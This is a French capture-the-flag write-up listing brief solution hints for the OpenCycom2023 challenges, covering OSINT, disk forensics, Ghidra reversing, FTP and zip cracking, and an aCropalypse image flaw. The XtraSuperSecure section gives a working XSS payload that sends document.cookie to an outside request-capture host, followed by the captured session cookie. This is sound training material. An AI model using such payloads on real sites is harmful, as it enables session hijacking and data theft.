# OpenCycom2023  
  
## Solutions  
  
### Minuit  
> 300, April 29th, 12:19:13 AM  
  
Chaque touche du piano = une lettre  
  
### Usurpception  
> 500, April 28th, 11:53:34 PM  
  
### Big blue whale  
> 100, April 28th, 11:17:34 PM  
  
J'ai pas capté, mais full utilisation de docker  
  
### Le Secret de la Tielle  
> 200, April 28th, 11:06:07 PM  
  
unzip disk.zip  
utilisation de e2fsck  
puis mount disk.img  
  
### Troubadour - Part5  
> 30, April 28th, 10:31:33 PM  
  
dans google: le café social Vincent lagaffe  
==> https://www.facebook.com/225817917437188/photos/pb.225817917437188.-2207520000../3312156235469992/?type=3&eid=ARClNwLpmDIVKs8kEm1K4HaU5FWj8fCt1PQFzcCx2EzyVQufcnIieGusJwIRH3uZkIMDAx-19McA59rv  
  
### XtraSuperSecure  
> 200, April 28th, 10:01:48 PM  

C'était formulaire pour pouvoir posté un commentaire, Comme le nom du challenge l'indique fallait utilisé un faille XSS.
sur [RequestBin](https://requestbin.com/) j'ai créer un projet pour pouvoir avoir une url ou envoyer les données.
J'ai ensuite envoyé ça dans le formulaire: 
```html
<IMG SRC="jav&#x09;ascript:fetch('https://eodp6vvn6mjjqbf.m.pipedream.net/?' + document.cookie);">
```

est en réponse au bout d'un moment on reçois:
```json
{
  "event": {
    "method": "GET",
    "path": "/",
    "query": {
      "flag": "OPC{b0y_I_l0v3_XSS}; connect.sid=s:8XG6k2A8x2iEnbbD1kD4xUT5KvF_ei3Z.NprtUNmR5jtodObQpm3Abx/Xs4RqrmmLd4cCIdskxyQ"
    },
    "client_ip": "40.66.35.70",
    "url": "https://eodp6vvn6mjjqbf.m.pipedream.net/?flag=OPC{b0y_I_l0v3_XSS};%20connect.sid=s%3A8XG6k2A8x2iEnbbD1kD4xUT5KvF_ei3Z.NprtUNmR5jtodObQpm3Abx%2FXs4RqrmmLd4cCIdskxyQ",
    "headers": {
      "host": "eodp6vvn6mjjqbf.m.pipedream.net",
      "sec-ch-ua": "",
      "sec-ch-ua-mobile": "?0",
      "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36",
      "sec-ch-ua-platform": "\"\"",
      "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "no-cors",
      "sec-fetch-dest": "image",
      "referer": "http://127.0.0.1:3000/",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "en-US"
    }
  },
  "context": {
    "id": "2P4MqKbROMoJPABF9IeWQXU2NV2",
    "ts": "2023-04-28T20:01:29.418Z",
    "pipeline_id": null,
    "workflow_id": "p_7NCjOZL",
    "deployment_id": "d_JesWrZPW",
    "source_type": "COMPONENT",
    "verified": false,
    "hops": null,
    "test": false,
    "replay": false,
    "owner_id": "o_W7I7Zkg",
    "platform_version": "3.38.3",
    "workflow_name": "RequestBin",
    "resume": null,
    "trace_id": "2P4MqH7RCDeWDm7LWOBabKUQMkk"
  }
}
```
  
### Troubadour - Part4  
> 30, April 28th, 10:00:11 PM  
  
Google: ...,  
==> https://www.midilibre.fr/2020/03/25/sete-la-madone-de-richard-di-rosa-a-le-masque,8818528.php  
on obtient place de l'hospiltalet sète  
  
Apple map:  
==> Le cafe social  
  
### Industrial Secrets - Partie 2  
> 200, April 28th, 9:56:28 PM  
  
dans le terminal:  
ftp (url)  
(name part1)  
(pass part1)  
  
download file  
./gocrackzip dictattack ~/Downloads/Last_clients.zip rockyou.txt  
ouvrir le fichier généerer avec libre office  
  
### Troubadour - Part3  
> 30, April 28th, 9:52:23 PM  
  
meme lien que la part1  
  
### SECURE KEY CHECK3R (Medium)  
> 400, April 28th, 9:48:35 PM  
  
utilisation ghidra  
comprendre comment le fichier est compresser.  
  
### Ca C Cool  
> 400, April 28th, 9:04:37 PM  
  
utilisation ghidra  
little endian -> big endian, et xor les 13 premier avec les 13 dernier  
  
### Industrial Secrets - Partie 1  
> 200, April 28th, 8:32:24 PM  
  
tapper les commandes:  
username admin  
password (celui qui est donne dans lenoncé)  
setValvle (un nombre tres grand)  
set(jsp)Text (une string tres grande)  
get(jsp)FTP  
  
### SECURE KEY CHECK3R (Easy)  
> 300, April 28th, 8:26:10 PM  
  
utilisation ghidra  
avoir 1337 avec une somme des assci du message, en gardant les 3 char qui sont donnée  
  
### Troubadour - Part2  
> 30, April 28th, 7:49:39 PM  
  
meme lien que la part1  
  
### Troubadour - Part1  
> 30, April 28th, 7:48:49 PM  
  
Utilisation de google image  
==> https://www.alamyimages.fr/photo-image-sculpture-la-madone-du-quartier-haut-ou-la-mamma-de-richard-di-rosa-a-sete-languedoc-roussillon-france-86379457.html  
  
### Welcome  
> 10, April 28th, 7:44:19 P  

## Solution de chall que j'ai pas fait

### 19.5:20
Faille à exploiter: aCropalypse
mettre l'image dans https://acropalypse.app/, en choissiant pixel 3

## Mes resultats  
  
### Classement: Top 2  
![Classement](./Result.png)  
![ScoreOverTime](./ScoreoverTime.png)  
  
